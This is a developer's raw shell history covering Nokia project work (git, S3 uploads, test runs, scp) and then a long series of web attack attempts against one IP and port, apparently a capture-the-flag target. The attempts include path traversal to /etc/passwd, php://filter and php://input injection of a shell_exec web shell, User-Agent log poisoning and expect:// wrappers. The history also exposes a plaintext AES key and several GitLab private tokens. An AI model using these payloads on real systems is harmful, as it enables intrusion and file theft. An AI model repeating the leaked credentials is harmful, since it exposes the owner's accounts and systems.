git config --local user.name "kulldox"
git config --local user.email "kulldox@gmail.com"
git push
git commit -m "disable the restore of the anyconnect profile by default" anyconnectControll-Sample.ini 
git push
git config credential.helper store
git commit -m "add AHK link" README.md 
git push
git pull
git config credential.helper store
git pull
cd -
cd /c/NAP/NAP4/CAPS/
ll
less caps_sa_upload_s3.py 
python ./caps_sa_upload_s3.py -v -np 4 -s 64  --aes --location MCT_rel4.0.2 -k S3@ch-dc-s3-gsn-33.eecloud.nsn-net.net:AES:8a00000000000000b2fa62361126a98283c9b71db9dcbd37bce4f724b96a83946c2a688b8f87558cee8533678cf2ba691b7ec160c22aa1b3bf32c69e68f5bcb83cec8dad0f314aaf024f6d0ccc953f3a1bb6f4b71d1b0b4c86e27babd314cda740de812373b597306ca3aa03956a09a14f87cfbcdcbe93c7abbffb16e439310b3535ec9e92ae359172e4d1f2f59c6d91722f1a12edb9a9c322f0686eee2616d241fbb0765b5b7bef --buildlabel "4.0.2" /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/out/
pip install boto
python ./caps_sa_upload_s3.py -v -np 4 -s 64  --aes --location MCT_rel4.0.2 -k S3@ch-dc-s3-gsn-33.eecloud.nsn-net.net:AES:8a00000000000000b2fa62361126a98283c9b71db9dcbd37bce4f724b96a83946c2a688b8f87558cee8533678cf2ba691b7ec160c22aa1b3bf32c69e68f5bcb83cec8dad0f314aaf024f6d0ccc953f3a1bb6f4b71d1b0b4c86e27babd314cda740de812373b597306ca3aa03956a09a14f87cfbcdcbe93c7abbffb16e439310b3535ec9e92ae359172e4d1f2f59c6d91722f1a12edb9a9c322f0686eee2616d241fbb0765b5b7bef --buildlabel "4.0.2" /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/out/
python ./caps_sa_upload_s3.py -v -np 4 -s 64  --aes --location MCTrel4.0.2 -k S3@ch-dc-s3-gsn-33.eecloud.nsn-net.net:AES:8a00000000000000b2fa62361126a98283c9b71db9dcbd37bce4f724b96a83946c2a688b8f87558cee8533678cf2ba691b7ec160c22aa1b3bf32c69e68f5bcb83cec8dad0f314aaf024f6d0ccc953f3a1bb6f4b71d1b0b4c86e27babd314cda740de812373b597306ca3aa03956a09a14f87cfbcdcbe93c7abbffb16e439310b3535ec9e92ae359172e4d1f2f59c6d91722f1a12edb9a9c322f0686eee2616d241fbb0765b5b7bef --buildlabel "4.0.2" /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/out/
python ./caps_sa_upload_s3.py -v -np 4 -s 64  --aes --location MCTrel402 -k S3@ch-dc-s3-gsn-33.eecloud.nsn-net.net:AES:8a00000000000000b2fa62361126a98283c9b71db9dcbd37bce4f724b96a83946c2a688b8f87558cee8533678cf2ba691b7ec160c22aa1b3bf32c69e68f5bcb83cec8dad0f314aaf024f6d0ccc953f3a1bb6f4b71d1b0b4c86e27babd314cda740de812373b597306ca3aa03956a09a14f87cfbcdcbe93c7abbffb16e439310b3535ec9e92ae359172e4d1f2f59c6d91722f1a12edb9a9c322f0686eee2616d241fbb0765b5b7bef --buildlabel "4.0.2" /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/out/
ll
cd /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/
ls -1
cd /c/miscprojects/cooltest/
ll
gem install bundler
ruby --version
apt-get install ruby
apt-get install ruby2.3.0
apt-get install ruby-2.3.0
rvm
rvm -help
rvm --help
rvm install 2.3.0
env rvm
which rvm
rbenv
rbenv install 2.3.0
cd /c/NAP/NAP4/
ll
mv caps_tool.sh CAPS/
ll
cd ../../nokia_git/
ll
cd napOperations/
git log
git tags
git tag list
git ta
git tag
ll
cd /c/NAP/NAP4/CAPS/
ll
curl -u 'marian_costin.costin.ext@nokia.com' -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ll
less NSNNAPgui-gui-1.9.0.tar.gz 
curl -u 'costin' -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ll
less NSNNAPgui-gui-1.9.0.tar.gz 
curl -u 'costin' -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ls -alh
curl -L -o NSNNAPgui-gui-1.9.0.tar.gz http://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ls -alh
curl -ivk -u 'costin' -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
curl -email 'marian_costin.costin.ext@nokia.com' -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ll
ls -alh
curl -ivk -u 'costin' -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
curl -ivk -u 'costin' -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
curl -ivk -u 'costin' -H "Host: gitlabe1.ext.net.nokia.com" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
curl -ivk -u 'costin' -H "Host: gitlabe1.ext.net.nokia.com" -H "DNT: 1" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
curl -ivk -u 'costin' -H "Host: gitlabe1.ext.net.nokia.com" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ls -alh
less NSNNAPgui-gui-1.9.0.tar.gz 
curl -ivk -H "Private-Token: W1szMDc1XSwiJDJhJDEwJFVwRXRkL2lzMGd0NFhCaklTSFREUHUiLCIxNTUwNDY4MDk0LjE5NDYyNDIiXQ==--e063a4d6f68d57a760527125f915659a17f6eb63" -H "Host: gitlabe1.ext.net.nokia.com" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ls -alh
curl -ivk -H "Private-Token: iyfc3d5z0y5vVdmDxekszCLfaiTlMykbThQu+EhaiBkKNPye/ufhBbt61dHhHKwexR4FJLXekTfmU8FXd+JM7Q==" -H "Host: gitlabe1.ext.net.nokia.com" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ls -alh
curl -ivk -H "Private-Token: CHdrx4MpyCix9XUespA2" -H "Host: gitlabe1.ext.net.nokia.com" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ls -alh
less NSNNAPgui-gui-1.9.0.tar.gz 
curl -H "Private-Token: CHdrx4MpyCix9XUespA2" -H "Host: gitlabe1.ext.net.nokia.com" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
curl -ivk -H "Private-Token: CHdrx4MpyCix9XUespA2" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
less NSNNAPgui-gui-1.9.0.tar.gz 
curl -H "Private-Token: CHdrx4MpyCix9XUespA2" -L -o NSNNAPgui-gui-1.9.0.tar.gz https://gitlabe1.ext.net.nokia.com/nap/napGUI/repository/gui-1.9.0/archive.tar.gz
ll
./caps_tool.sh start -call 
bash -x ./caps_tool.sh start -call 
./caps_tool.sh start -call 
ll
rm NSNNAPgui-gui-1.9.0.tar.gz 
exit
cd /c/NAP/NAP4/rel-4.2.x/
ll
cd GMLC/
ll
tcpdump -qAtttl -r GMLC_MLP_c12_SP1_PP05.pcap 
tcpdump -qAtttl -r GMLC_MLP_c12_SP1_PP05.pcap |less
tcpdump -qAttl -r GMLC_MLP_c12_SP1_PP05.pcap |less
tcpdump -qAtl -r GMLC_MLP_c12_SP1_PP05.pcap |less
tcpdump -qAt -r GMLC_MLP_c12_SP1_PP05.pcap |less
tcpdump -qA -r GMLC_MLP_c12_SP1_PP05.pcap |less
tcpdump -q -r GMLC_MLP_c12_SP1_PP05.pcap |less
tcpdump -A -r GMLC_MLP_c12_SP1_PP05.pcap |less
find /c/NAP/ -iname "TMO-NAP-DIT*.doc*"
find /c/ -iname "TMO-NAP-DIT*.doc*"
cd .././.
cd /c/miscprojects/cooltest/conf/
ll
less CustomerTransaction-v24.xsd
grep '<xsd:element name="(.*)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="(.*)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="(?=.*)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="(=?.*)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="(?=.*)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="(?=[az-AZ]+)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="([az-AZ]+)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd 
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq 
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |sort
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |sort -u
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|sort|
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|sort
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|sort -u
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|sort -a
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|sort -n
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|wc -c
grep -oP '<xsd:element name="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|wc -L
grep -oP 'type="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|wc -L
grep -oP 'type="([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'
less CustomerTransaction-v24.xsd
grep -oP 'type="xsd:([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'
grep -oP 'type="xsd:([aA-zZ]+)"' CustomerTransaction-v24.xsd |sort | uniq |awk -F'"' '{print $2}'|wc -L
printf "%d\n" "asdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasd"
wc --bytes "asdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasd"
wc -c --bytes "asdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasd"
echo "asdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasd"|wc -c --bytes
scp -r nap@ncsel001:/var/opt/tmp/wo3396246task20/* /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/MW8-reinstallELG/logs/
exit
cd /c/miscprojects/
./startTest.sh TC_rel3.9.0.rb "test_TC_NSNNAPTHREE1489_01"
cd cooltest/
./startTest.sh TC_rel3.9.0.rb "test_TC_NSNNAPTHREE1489_01"
./startTest.sh TC_E2E.rb "all";
scp /c/nokia_git/napOperations/bin/napHelper.sh  nap@ncsda01:/home/nap/napHelper2.sh
scp /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/napHelper.sh  root@ncsda01:/home/nap/napHelper.sh
./startTest.sh TC_rel4.1.6.rb "test_TC_Overload_PPS_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_Overload_PPS_11n";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
history|grep dummy
./startTest.sh TC_dummy.rb "test_partnerRequest";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
exit
cd /c/UpWork/25Feb2019/
ll
less Sample.json 
less output.txt 
ll
cat RealExampleFile.txt | perl -ne 'if (/(\w+Exception\w*)/i) {print "$1\n"} 
cat RealExampleFile.txt | perl -ne 'if (/Begin Object Class=.* Name="(.*)"/i) {print "$1\n"} '
cd 
ll
./getmp3Listfromyoutube.sh "https://www.youtube.com/playlist?list=PLRrumtT8AAeynHLKgetIb_-FCF_gJ8tU6"
cd /c/NAP/Alan/
grep "attributeName: napPrivacyPrefs" nap61.ldif.txt 
grep -A1 "attributeName: napPrivacyPrefs" nap61.ldif.txt 
grep -A1 "attributeName: napPrivacyPrefs" nap61.ldif.txt | grep syntaxType
grep -A1 "attributeName: napPrivacyPrefs" nap61.ldif.txt | grep syntaxType | awk '{print $2}'
grep -A10syntaxId=$(grep -A1 "attributeName: napPrivacyPrefs" nap61.ldif.txt | grep syntaxType | awk '{print $2}') nap61.ldif.txt 
grep -A10 syntaxId=$(grep -A1 "attributeName: napPrivacyPrefs" nap61.ldif.txt | grep syntaxType | awk '{print $2}') nap61.ldif.txt 
grep -A10 "syntaxId=$(grep -A1 "attributeName: napPrivacyPrefs" nap61.ldif.txt | grep syntaxType | awk '{print $2}')" nap61.ldif.txt 
grep -A10 "syntaxId=1.3.6.1.4.1.4329.1.6.5.6456" nap61.ldif.txt 
grep -A1 "attributeName: napPrivacyPrefs" nap61.ldif.txt | grep syntaxType | awk '{print $2}'
grep -A10 "syntaxId=1.3.6.1.4.1.4329.1.6.5.6456" nap61.ldif.txt 
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/MW9-rollbackELG/wo2780632task73/
ll
mkdir logs
scp -r nap@ncsel001:/var/opt/tmp/wo2780632task73/* logs/
exit
cd /c/miscprojects/cooltest/
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
grep dspa.log tests/*.rb
grep FE_dspaLog tests/*.rb
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
grep inspect tests/*
grep -r inspect lib/*
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
./startTest.sh TC_dummy.rb "test_partnerRequest";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
./startTest.sh TC_dummy.rb "test_partnerRequest";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
grep CustServiceRecalcRequest tests/*.rb
./startTest.sh TC_rel4.1.6.rb "test_TC_UI_overload_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_UPSELL_overload_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_01 test_TC_UPSELL_overload_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_Overload_PPS_11";
./startTest.sh TC_rel4.1.6.rb "test_TC_Overload_PPS_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_01";
grep Cast tests/*.rb
./startTest.sh TC_rel3.9.0.rb "test_TC_NSNNAPTHREE1489_01";
exit
z=`expr 5/2`
echo $z
z=`expr 5 / 2`
echo $z
who
while who | grep aa12 | wc -l; do echo false; done;
cd /c/NAP/NAP4/release-4.1.6/tmolab-installs/rollback-ORL-to-4.0.2/
ll
scp nap@ncsda01:/var/opt/tmp/rollackORL_to_4.0.2/* logs/
cd ../upgrade-ORL-to-4.1.6/
scp nap@ncsda01:/var/opt/tmp/rel4.1.6-ORL-upgrade/* logs/
cd /c/miscprojects/cooltest/
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_01";
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_UI_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_UPSELL_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_02";
./startTest.sh TC_E2E.rb "all";
./startTest.sh TC_rel4.1.6.rb "test_TC_UI_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_UI_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_UI_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_UPSELL_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_PPS_overload_02";
./startTest.sh TC_rel4.1.6.rb "test_TC_DSPA_overload_02";
./startTest.sh TC_E2E.rb "all";
./startTest.sh TC_E2E.rb "test_TC_E2E_01";
./startTest.sh TC_E2E.rb "test_TC_E2E_06 test_TC_E2E_07";
./startTest.sh TC_E2E.rb "test_TC_E2E_01";
./startTest.sh TC_E2E.rb "test_TC_E2E_07";
exit
exi
exit
exit
cd /c/NAP/NAP4/release-4.1.6/
ll
cd packages/
ll
scp nap-4.1.7-1.x86_64.rpm nap@ncsda01:/var/opt/nap/packages/
cd /c/miscprojects/cooltest/
./startTest.sh TC_E2E.rb "test_TC_E2E_07";
scp /c/NAP/NAP4/release-4.1.6/packages/nap-4.1.7-1.x86_64.rpm nap@ncsda01:/var/opt/nap/packages/
exit
ssh nap@ncsda01
exit
ssh nap@napor01
exit
tmux
exit
cd /c/miscprojects/
ll
cd /c/UpWork/Convert_a_chef_cookbook_to_bash_scripts/bash-version/
ll
cd recipes/
ll
cp default.sh salesforce.sh
cp default.sh backend.sh
cp default.sh services.sh
cp default.sh admin.sh
cp default.sh schedulers.sh
cd $(dirname $0) && pwd
cd /c/UpWork/Convert_a_chef_cookbook_to_bash_scripts/bash-version
ll
./redeploy-staging.sh 
cd /c/miscprojects/cooltest/
ll
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_01"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_02"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_04"
crul http://35.227.24.107:5001/74c04102f2/?page=../../../../../../etc/passwd%00
curl http://35.227.24.107:5001/74c04102f2/?page=../../../../../../etc/passwd%00
for i in 1..10; do echo i; done
for i in 1..10; do echo $i; done
for i in {1..10}; do echo $i; done
for i in {1..10}; do b="$b../"; curl http://35.227.24.107:5001/74c04102f2/?page=${b}/etc/passwd%00; done
for i in {1..10}; do b="$b../"; curl http://35.227.24.107:5001/74c04102f2/?page=${b}etc/passwd%00; done
b=""; for i in {1..10}; do b="$b../"; curl http://35.227.24.107:5001/74c04102f2/?page=${b}etc/passwd%00; done
b=""; for i in {1..20}; do b="$b../"; curl http://35.227.24.107:5001/74c04102f2/?page=${b}etc/passwd%00; done
curl http://35.227.24.107:5001/74c04102f2/?page='); echo phpinfo();
curl "http://35.227.24.107:5001/74c04102f2/?page='); echo phpinfo();"
curl "http://35.227.24.107:5001/74c04102f2/?page=');print('test"
curl "http://35.227.24.107:5001/74c04102f2/?page=\');print('test"
curl "http://35.227.24.107:5001/74c04102f2/?page=\");print('test"
curl "http://35.227.24.107:5001/74c04102f2/?page=");print('test"
curl "http://35.227.24.107:5001/74c04102f2/?page=\");print('test"
curl "http://35.227.24.107:5001/74c04102f2/?page=\");print('test%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=);print('test%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=top.php);print('test%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=first.php);print('test%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=first"
curl "http://35.227.24.107:5001/74c04102f2/?page="
curl "http://35.227.24.107:5001/74c04102f2/"
curl "http://35.227.24.107:5001/74c04102f2/?page=First"
curl "http://35.227.24.107:5001/74c04102f2/?page=first_post"
curl "http://35.227.24.107:5001/74c04102f2/?page=1"
curl "http://35.227.24.107:5001/74c04102f2/?page=2"
curl "http://35.227.24.107:5001/74c04102f2/?page=admin.auth.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=top.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=header.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=admin.auth.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=auth.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=first.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=); print_r(scandir('.'%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=\); print_r(scandir('.'%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=\); print_r(scandir\('.')%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=\); print_r\(scandir\('.'\)%00"
curl -ivk "http://35.227.24.107:5001/74c04102f2/?page=\); print_r\(scandir\('.'\)%00"
curl -ivk "http://35.227.24.107:5001/74c04102f2/?page='\); print_r\(scandir\('.'\)%00"
curl -ivk "http://35.227.24.107:5001/74c04102f2/?page='\); print_r\(scandir\('.'\)\)%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=admin.auth.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=footer.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=footer.inc%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=header.inc%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=posts.inc%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=posts.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=post.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc&posts="
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc&posts=1"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc&posts=2"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc&posts=3"
curl "http://35.227.24.107:5001/74c04102f2/?page=posts.inc"
nc 35.227.24.107 5001
curl "http://35.227.24.107:5001/74c04102f2/?page=php://filter/convert.base64-encode/resource=config%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=php://filter/convert.base64-encode/resource=config"
curl "http://35.227.24.107:5001/74c04102f2/?page=zip://image.zip#shell"
curl "http://35.227.24.107:5001/74c04102f2/?page=phar://image.phar/shell"
curl "http://35.227.24.107:5001/74c04102f2/?page=/proc/self/environ&cmd=id"
curl "http://35.227.24.107:5001/74c04102f2/?page=/proc/self/environ&cmd=id%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=/proc/self/environ%00&cmd=id"
curl -H "<?php echo assert($_GET['cmd']);?>" "http://35.227.24.107:5001/74c04102f2/?page=/proc/self/environ%00&cmd=id"
curl -H "User-Agent: <?php echo assert($_GET['cmd']);?>" "http://35.227.24.107:5001/74c04102f2/?page=/proc/self/environ%00&cmd=id"
curl -H "User-Agent: <?php echo assert($_GET['cmd']);?>" "http://35.227.24.107:5001/74c04102f2/?page=home.inc%00&cmd=id"
curl -H "User-Agent: <?php echo assert($_GET['cmd']);?>" "http://35.227.24.107:5001/74c04102f2/?page=home.inc&cmd=id"
curl "http://35.227.24.107:5001/74c04102f2/?page=../../../../var/log/access.log"
curl "http://35.227.24.107:5001/74c04102f2/?page=../../../../var/log/access.log%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=/var/log/access.log%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=posts.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=end.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc.php\\')"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc.php\\\')"
curl "http://35.227.24.107:5001/74c04102f2/?page=home.inc.php\\\'\)"
curl "http://35.227.24.107:5001/74c04102f2/?page=.htaccess%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=qq/n[..4041..]n/../../../../../../../../../etc/passwd.txt%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=qq/n\[..4041..\]n/../../../../../../../../../etc/passwd.txt%00"
curl "http://35.227.24.107:5001/74c04102f2/?page=qq\/n\[..4041..\]n/../../../../../../../../../etc/passwd.txt%00"
curl 'http://35.227.24.107:5001/74c04102f2/?page=qq/n[..4041..]n/../../../../../../../../../etc/passwd.txt%00'
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=qq/n[..4041..]n/../../../../../../../../../etc/passwd.txt%00'
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=php://input&cmd=ls%00'
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=php://input&cmd=date%00'
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=php://input&cmd=ls%00' -d "<?php echo shell_exec($_GET['cmd']);?>"
curl -g -ivk 'http://35.227.24.107:5001/74c04102f2/?page=php://input&cmd=ls%00' -d "<?php echo shell_exec($_GET['cmd']);?>"
curl -X -g -ivk 'http://35.227.24.107:5001/74c04102f2/?page=php://input&cmd=ls%00' -d "<?php echo shell_exec($_GET['cmd']);?>"
curl -X POST -g -ivk 'http://35.227.24.107:5001/74c04102f2/?page=php://input&cmd=ls%00' -d "<?php echo shell_exec($_GET['cmd']);?>"
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=expect://ls%00'
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=php://filter/convert.base64-encode/resource=/etc/passwd%00'
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=php://filter/convert.base64-encode/resource=/etc/passwd'
curl -g 'http://35.227.24.107:5001/74c04102f2/?page=php://filter/resource=/etc/passwd'
qq/n[..4041..]n
b=""; for i in {1..50}; do b="$b../"; curl http://35.227.24.107:5001/74c04102f2/?page=${b}etc/passwd%00; done
